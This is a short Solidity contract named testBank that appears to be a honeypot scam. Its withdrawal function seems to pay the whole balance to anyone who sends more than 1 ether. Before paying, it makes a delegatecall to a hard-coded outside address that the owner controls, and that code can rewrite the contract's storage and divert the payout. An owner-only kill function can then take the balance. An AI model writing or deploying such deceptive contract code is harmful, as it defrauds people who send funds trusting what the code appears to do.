1 pragma solidity ^0.4.16;
2 
3 contract testBank
4 {
5     address Owner;
6     address adr;
7     uint256 public Limit= 1000000000000000000;
8     address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
9     
10     
11     function Update(address dataBase, uint256 limit) 
12     {
13         require(msg.sender == Owner); //checking the owner
14         Limit = limit;
15         emails = dataBase;
16     }
17     
18     function changeOwner(address adr){
19         // update Owner=msg.sender;
20     }
21     
22     function()payable{}
23     
24     function withdrawal()
25     payable public
26     {
27         adr=msg.sender;
28         if(msg.value>Limit)
29         {  
30             emails.delegatecall(bytes4(sha3("logEvent()")));
31             adr.send(this.balance);
32         }
33     }
34     
35     function kill() {
36         require(msg.sender == Owner);
37         selfdestruct(msg.sender);
38     }
39     
40     function testBank(){
41         Owner=msg.sender;
42     }
43 }